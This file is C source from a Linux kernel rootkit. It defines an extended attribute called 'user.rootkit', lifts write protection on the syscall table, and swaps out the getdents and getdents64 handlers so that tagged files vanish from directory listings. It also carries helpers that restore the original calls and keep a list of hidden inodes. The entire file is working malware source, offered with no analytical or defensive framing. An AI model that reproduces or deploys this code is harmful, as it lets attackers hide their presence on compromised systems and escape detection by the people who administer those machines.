#include <linux/xattr.h>
#include <linux/fs.h>
#include <linux/fdtable.h>

#define G7_XATTR_NAME "user.rootkit"
#define G7_XATTR_VAL  "rootkit"

#include "common.h"
#include "filehide.h"
#include "hook.h"

#define BUFLEN 64

void
hide_files(void)
{
    if (atomic_inc_return(&getdents_install_count) == 1) {
        disable_protection();
        sys_calls[__NR_getdents] = (void *)g7_getdents;
        sys_calls[__NR_getdents64] = (void *)g7_getdents64;
        enable_protection();
    }
}

void
unhide_files(void)
{
    if (atomic_dec_return(&getdents_install_count) < 0) {
        atomic_set(&getdents_install_count, 0);

        if (sys_getdents) {
            disable_protection();
            sys_calls[__NR_getdents] = (void *)sys_getdents;
            enable_protection();
            while (atomic_read(&getdents_count) > 0);
        }

        if (sys_getdents64) {
            disable_protection();
            sys_calls[__NR_getdents64] = (void *)sys_getdents64;
            enable_protection();
            while (atomic_read(&getdents64_count) > 0);
        }
    }
}


unsigned long
must_hide_inode(struct dentry *dentry)
{
    char buf[BUFLEN];

    if(dentry && dentry->d_inode)
        if(!inode_permission(dentry->d_inode, MAY_READ)) {
            ssize_t len = vfs_getxattr(dentry, G7_XATTR_NAME, buf, BUFLEN);

            if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL)))
                return dentry->d_inode->i_ino;
        }

    return 0;
}

bool
list_contains_inode(inode_list_t_ptr node, unsigned long inode)
{
    inode_list_t_ptr i;
    for (i = node; i; i = i->next)
        if (i->inode == inode)
            return true;

    return false;
}

inode_list_t_ptr
add_inode_to_list(inode_list_t_ptr tail, unsigned long inode)
{
    inode_list_t_ptr node;
    node = (inode_list_t_ptr)kmalloc(sizeof(inode_list_t), GFP_KERNEL);

    if (node) {
        node->inode = inode;
        node->next = NULL;
        tail->next = node;
        return node;
    }

    return NULL;
}
